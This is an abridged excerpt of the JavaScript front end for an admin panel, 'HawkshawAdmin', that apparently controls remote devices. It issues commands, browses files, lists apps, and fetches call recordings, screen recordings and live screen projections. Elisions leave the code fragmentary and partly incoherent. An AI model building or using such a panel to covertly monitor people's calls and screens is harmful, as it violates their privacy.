...
window.stopScreenRecording = function() {
    if (window.hawkshawAdmin && typeof window.hawkshawAdmin.stopRecording === 'function') {
        window.hawkshawAdmin.stopRecording();
    }
};

window.startScreenProjection = function() {
    if (window.hawkshawAdmin && typeof window.hawkshawAdmin.startProjection === 'function') {
        const sessionId = prompt('Enter session ID to start:');
        if (sessionId) {
            window.hawkshawAdmin.startProjection(sessionId);
        }
    }
};

window.deleteScreenRecording = function(recordingId) {
    if (window.hawkshawAdmin && typeof window.hawkshawAdmin.deleteRecording === 'function') {
        if (confirm('Are you sure you want to delete this recording?')) {
            window.hawkshawAdmin.deleteRecording(recordingId);
        }
    }
};

window.startScreenRecording = function() {
    if (window.hawkshawAdmin && typeof window.hawkshawAdmin.startRecording === 'function') {
        window.hawkshawAdmin.startRecording();
    }
};

// Main HawkshawAdmin object
const HawkshawAdmin = {
    init: async function() {
        this.socket = null;
    ...
    updateDashboardStats: function(stats) {
        ...
        const totalCmdEl = document.getElementById('totalCommands');
        const pendingCmdEl = document.getElementById('pendingCommands');
        
        if (totalEl) totalEl.textContent = stats.total_devices || 0;
        if (onlineEl) onlineEl.textContent = stats.online_devices || 0;
        if (totalCmdEl) totalCmdEl.textContent = stats.total_commands || 0;
        if (pendingCmdEl) pendingCmdEl.textContent = stats.pending_commands || 0;
    },
    ...
    requestAppsList: async function() {
    ...
    openApp: async function(packageName) {
        if (!this.currentDevice) return;
    ...
    loadFileExplorerSection: async function() {
        if (!this.currentDevice) {
...
getFileIcon: function(fileType, mimeType) {
    ...
    // Audio Management
    loadAudioSection: async function() {
        if (!this.currentDevice) {
            this.showAlert('Please select a device first', 'warning');
            return Promise.resolve();
        }
    ...
    setAudioSettings: async function() {
        try {
            if (!this.currentDevice) return;
            ...
            this.showNotification('Failed to update audio settings', 'danger');
        }
    },
    ...
    // Command System
    sendCommand: async function(commandType, commandData = {}) {
        if (!commandType) {
    ...
    showAlert: function(message, type = 'info') {
        ...
        return alertDiv; // Return the alert element in case we need to manually remove it
    },
    ...
    loadCallRecordings: async function() {
        if (!this.currentDevice) {
            this.showAlert('Please select a device first', 'warning');
            return;
        }
    ...
    getCallRecordingFilters: function() {
        return {
    ...
    updateCallRecordingStats: function(stats) {
        ...
        // Show stats section
        const statsEl = document.getElementById('callRecordingStats');
        if (statsEl) statsEl.style.display = 'block';
    },

    renderCallRecordingsTable: function(recordings, pagination) {
        const container = document.getElementById('callRecordingsContainer');
        if (!container) return;
    ...
    downloadCallRecording: async function(recordingId) {
        try {
    ...
    displayScreenRecordings: function(recordings) {
    ...
    startScreenRecording: async function() {
    ...
    loadActiveProjections: async function() {
        try {
    ...
    updateProjectionStats: async function() {
        try {
    ...
    startScreenProjection: async function() {
        ...
        try {
            ...
            if (data.success) {
                ...
                throw new Error(data.error || 'Failed to start screen projection');
            }
        } catch (error) {
            console.error('Error starting screen projection:', error);
            this.showNotification(`Failed to start screen projection: ${error.message}`, 'danger');
            throw error;
        }
    }


    stopProjection: async function(sessionId) {
        try {
            ...
            if (data.success) {
                ...
                throw new Error(data.message || 'Failed to stop screen projection');
            }
        } catch (error) {
            console.error('Stop projection error:', error);
            this.showNotification(`Failed to stop screen projection: ${error.message}`, 'danger');
            throw error;
        }
    },

    joinProjection: async function(sessionId, accessToken = null) {
        try {
    ...
    updateScreenFrame: function(data) {
    ...
    refreshCallRecordings: function() {
        this.loadCallRecordings();
    },

    loadCallRecordingsPage: function(page) {
...
window.escapeHtml = function(unsafe) {
    if (typeof HawkshawAdmin !== 'undefined' && typeof HawkshawAdmin.escapeHtml === 'function') {
        return HawkshawAdmin.escapeHtml(unsafe);
    }
